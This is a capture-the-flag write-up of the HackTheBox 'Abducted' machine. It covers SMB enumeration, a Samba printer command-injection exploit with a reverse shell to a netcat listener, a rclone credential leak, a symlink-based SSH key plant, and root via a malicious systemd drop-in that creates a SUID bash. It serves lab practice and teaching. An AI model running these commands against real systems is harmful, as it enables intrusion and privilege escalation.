# HackTheBox — Abducted | Full Writeup


Abducted is a Medium-difficulty Linux machine centered around a Samba misconfiguration and a printer RPC vulnerability. The attack chain involves unauthenticated RCE via CVE-2026-4480, credential harvesting from a backup config, a symlink attack against an SMB share to pivot users, and finally privilege escalation via a writable systemd drop-in file combined with polkit delegation.

---

## 1. Reconnaissance

```bash
nmap -p- --open $TARGETIP -sC -sV
```

**Result:** Two services exposed — SSH on port 22 and Samba (SMB) on ports 139/445. No web service, so SMB is the primary attack surface.

---

## 2. SMB Enumeration

### List shares anonymously

```bash
smbclient -N -L //TARGETIP
```

**Result:** Four shares found:
- `HP-Reception` — Printer share (guest ok)
- `projects` — Disk share (restricted)
- `transfer` — Disk share (restricted)
- `IPC$` — IPC service

### Full enumeration

```bash
enum4linux-ng -A TARGETIP
```

**Key findings:**
- Server allows guest access (any username, empty password)
- One local user found: `scott` (Scott Mercer, RID 0x3e8)
- `projects` and `transfer` shares deny anonymous access

### RPC user details

```bash
rpcclient -U "" -N TARGETIP
rpcclient $> queryuser 0x3e8
```

**Result:** No useful description or password hints. Password policy shows minimum 5 characters, no complexity requirement.

### Samba config (found after foothold)

```
print command = /usr/local/bin/printaudit %J %s
```

This reveals the printer share executes a custom script — the entry point for CVE-2026-4480.

---

## 3. Initial Foothold — CVE-2026-4480

**Vulnerability:** Unauthenticated Samba print command injection via the spoolss RPC interface. The `HP-Reception` printer share executes `/usr/local/bin/printaudit` without sanitizing user-controlled input, allowing arbitrary command injection.

### Setup

```bash
# Clone the PoC
git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC
cd CVE-2026-4480-PoC

# Start a listener
nc -lvnp 4444
```

### Exploit

```bash
python3 exploit.py $TARGETIP <LHOST> 4444 -P HP-Reception
```

**Result:** Reverse shell as `nobody` (uid=65534).

```
nobody@abducted:/var/spool/samba$
```

---

## 4. Lateral Movement — nobody → scott

### Discover backup config

```bash
cat /etc/cron.d/offsite-backup
# 30 2 * * * root /opt/offsite-backup/sync.sh

cat /opt/offsite-backup/sync.sh
# /usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects

cat /opt/offsite-backup/rclone.conf
```

**Result:** rclone config exposes an encoded password:

```
user = svc-backup
pass = HZKAxfnMj-$xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Decode the password

```bash
rclone reveal "HZKAxfnMj-$xxxxxxxxxxxxxxxxxxxxxxxxxxx"
# → decyrpted passwd
```

rclone stores passwords in its own obfuscation format. The `reveal` command decodes it to plaintext.

### SSH as scott

```bash
ssh scott@TARGETIP
# password: xxxxxxxxxxxxxx
```

**Result:** Shell as `scott`. Grab `user.txt`:

```bash
cat ~/user.txt
```

---

## 5. Lateral Movement — scott → marcus

### Analyse SMB shares config

```bash
cat /etc/samba/shares.conf
```

Key settings in the `transfer` share:

```
force user = marcus
wide links = yes
```

- `force user = marcus` — any SMB connection to this share runs as `marcus`
- `wide links = yes` — Samba follows symlinks outside the share directory

This means: if we create a symlink in `/srv/transfer` pointing to `/home/marcus`, we can read and write marcus's files via SMB — as marcus.

### Create SSH key pair

```bash
ssh-keygen -t rsa -f /tmp/marcus_key -N ""
cp /tmp/marcus_key.pub /srv/transfer/
```

### Connect via SMB and write authorized_keys

```bash
smbclient //TARGETIP/transfer -U scott
```

```
smb: \> cd marcus_home        # (symlink to /home/marcus created earlier)
smb: \marcus_home\> mkdir .ssh
smb: \marcus_home\.ssh\> put marcus_key.pub authorized_keys
```

Because `force user = marcus`, the `authorized_keys` file is written as marcus.

### SSH as marcus

```bash
ssh -i /tmp/marcus_key marcus@TARGETIP
```

**Result:** Shell as `marcus`.

---

## 6. Privilege Escalation — marcus → root

### Check group membership

```bash
id
# uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Marcus is in the `operators` group. This group has polkit delegation to restart the `smbd` service.

### Verify restart capability

```bash
systemctl restart smbd
# (no error — confirmed)
```

### Find writable systemd paths

```bash
find /etc/systemd -writable 2>/dev/null
find /usr/lib/systemd -writable 2>/dev/null
```

`/etc/systemd/system/smbd.service.d/` directory can be created by marcus.

### Create malicious drop-in override

```bash
mkdir -p /etc/systemd/system/smbd.service.d/

cat > /etc/systemd/system/smbd.service.d/override.conf << EOF
[Service]
ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
EOF
```

- `ExecStartPre` runs before the service starts — as root
- `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash` creates a SUID copy of bash

### Trigger the exploit

```bash
systemctl daemon-reload
systemctl restart smbd
```

### Get root shell

```bash
/tmp/rootbash -p
id
# uid=0(root)
cat /root/root.txt
```

---

## Attack Chain

```
nmap (ports 22, 139, 445)
  └─→ SMB enum → scott user, HP-Reception printer share
        └─→ CVE-2026-4480 → nobody shell (printer command injection)
              └─→ rclone.conf → encoded creds → iXzvcib3SrpZ → scott SSH
                    └─→ SMB force user + wide links → symlink attack → marcus SSH
                          └─→ operators group + polkit → systemd drop-in → SUID bash → ROOT
```

---

## Key Concepts

| Term | Explanation |
|------|-------------|
| CVE | Common Vulnerabilities and Exposures — official vulnerability ID |
| RCE | Remote Code Execution — running arbitrary code on a remote system |
| Reverse shell | Target machine connects back to attacker's listener |
| SMB share | Network-accessible folder/printer via SMB protocol |
| force user | Samba setting that maps all connections to a specific OS user |
| wide links | Samba setting allowing symlinks to point outside the share |
| Symlink attack | Using a symbolic link to access files outside intended scope |
| rclone obscure | rclone's password obfuscation format (not encryption) |
| systemd drop-in | Override file that extends a service config without modifying the original |
| ExecStartPre | systemd directive — command run before service starts, as root |
| polkit | Linux framework controlling which users can perform privileged actions |
| SUID | Linux permission bit — file runs with owner's privileges (root) |
| operators group | Custom group with polkit delegation to restart smbd |

---

## Flags

| Flag | Path |
|------|------|
| user.txt | `/home/scott/user.txt` |
| root.txt | `/root/root.txt` |
